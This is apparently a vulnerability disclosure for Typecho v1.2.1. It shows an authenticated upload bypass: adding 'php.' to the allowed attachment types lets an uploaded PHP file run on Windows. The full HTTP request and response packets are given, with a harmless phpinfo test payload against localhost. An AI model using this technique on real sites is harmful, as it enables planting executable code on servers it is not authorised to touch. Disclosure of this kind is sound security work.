# typecho-v1.2.1-RCE
typecho-v1.2.1-RCE

##Vulnerability to reproduce
Log in to the backend of the website. Locate the /admin/options-general.php file and add 'php.' to the '其他格式' section at the bottom. Then click on '保存设置'.

```php
POST /typecho/index.php/action/options-general?_=7f7f3849a454840627316bb52364d2fc HTTP/1.1
Host: 127.0.0.1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/114.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
Accept-Encoding: gzip, deflate
Content-Type: application/x-www-form-urlencoded
Content-Length: 262
Origin: http://127.0.0.1
Connection: close
Referer: http://127.0.0.1/typecho/admin/options-general.php
Cookie: 49687d6f50b4bcdd180e408f21e5efa5__typecho_uid=1; 49687d6f50b4bcdd180e408f21e5efa5__typecho_authCode=%24T%24uKyiUEUfT3f8a523484b8bf9731cc8c1d2a8b6aa7; PHPSESSID=s25t07f2di5m8kfc5vuqf5bg7l; DedeUserID=1; DedeUserID1BH21ANI1AGD297L1FF21LN02BGE1DNG=1910606b29d5c2ce; DedeLoginTime=1686923767; DedeLoginTime1BH21ANI1AGD297L1FF21LN02BGE1DNG=64371f6768b13b59; _csrf_name_6f6a18a7=ca33b084396b5d22e954fe124954e4dc; _csrf_name_6f6a18a71BH21ANI1AGD297L1FF21LN02BGE1DNG=c51a2607b5a3e048
Upgrade-Insecure-Requests: 1
Sec-Fetch-Dest: document
Sec-Fetch-Mode: navigate
Sec-Fetch-Site: same-origin
Sec-Fetch-User: ?1

title=Hello+World&siteUrl=http%3A%2F%2F127.0.0.1%2Ftypecho&description=Your+description+here.&keywords=typecho%2Cphp%2Cblog&allowRegister=0&allowXmlRpc=2&timezone=28800&attachmentTypes%5B%5D=%40image%40&attachmentTypes%5B%5D=%40other%40&attachmentTypesOther=php.
```

![web](./typecho-V1.2.1_rce_01.png)

Visit the URL 'http://127.0.0.1/typecho/admin/write-post.php'. This is based on the current directory where I have set up. The actual directory is 'admin/write-post.php'. After entering, click on the '附件' button on the right side, and then click the highlighted button '选择文件上传'. Upload a random PHP file here and the system will not block it. After successful upload, the file can still be executed and the PHP address will be returned.

![web](./typecho-V1.2.1_rce_02.png)

The following is the request packet.

```php
POST /typecho/index.php/action/upload?_=d84b30765596739f0c2d3724d7971184 HTTP/1.1
Host: 127.0.0.1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/114.0
Accept: */*
Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
Accept-Encoding: gzip, deflate
Content-Type: multipart/form-data; boundary=---------------------------163606809438821006984144374022
Content-Length: 519
Origin: http://127.0.0.1
Connection: close
Referer: http://127.0.0.1/typecho/admin/write-post.php
Cookie: 49687d6f50b4bcdd180e408f21e5efa5__typecho_uid=1; 49687d6f50b4bcdd180e408f21e5efa5__typecho_authCode=%24T%24uKyiUEUfT3f8a523484b8bf9731cc8c1d2a8b6aa7; PHPSESSID=s25t07f2di5m8kfc5vuqf5bg7l; DedeUserID=1; DedeUserID1BH21ANI1AGD297L1FF21LN02BGE1DNG=1910606b29d5c2ce; DedeLoginTime=1686923767; DedeLoginTime1BH21ANI1AGD297L1FF21LN02BGE1DNG=64371f6768b13b59; _csrf_name_6f6a18a7=ca33b084396b5d22e954fe124954e4dc; _csrf_name_6f6a18a71BH21ANI1AGD297L1FF21LN02BGE1DNG=c51a2607b5a3e048
Sec-Fetch-Dest: empty
Sec-Fetch-Mode: cors
Sec-Fetch-Site: same-origin

-----------------------------163606809438821006984144374022
Content-Disposition: form-data; name="name"

20230616121905.php
-----------------------------163606809438821006984144374022
Content-Disposition: form-data; name="file"; filename="phpinfo.php"
Content-Type: application/octet-stream

<?php
phpinfo();
?>
-----------------------------163606809438821006984144374022--
```

The following is the response packet.

```php
HTTP/1.1 200 OK
Date: Fri, 16 Jun 2023 14:51:24 GMT
Server: Apache/2.4.39 (Win64) OpenSSL/1.1.1b mod_fcgid/2.3.9a mod_log_rotate/1.02
X-Powered-By: PHP/7.3.4
Expires: Thu, 19 Nov 1981 08:52:00 GMT
Cache-Control: no-store, no-cache, must-revalidate
Pragma: no-cache
Connection: close
Content-Type: application/json; charset=UTF-8
Content-Length: 303

["http:\/\/127.0.0.1\/typecho\/usr\/uploads\/2023\/06\/3042336957.php",{"cid":8,"title":"phpinfo.php","type":"php","size":21,"bytes":"1 Kb","isImage":false,"url":"http:\/\/127.0.0.1\/typecho\/usr\/uploads\/2023\/06\/3042336957.php","permalink":"http:\/\/127.0.0.1\/typecho\/index.php\/attachment\/8\/"}]
```

The requested URL is 'http://127.0.0.1/typecho/usr/uploads/2023/06/3042336957.php'.

![web](./typecho-V1.2.1_rce_03.png)

##Vulnerability Analysis
The website filtered extensions such as php, php5, php3, etc., but forgot about php. It can still be parsed successfully on Windows.
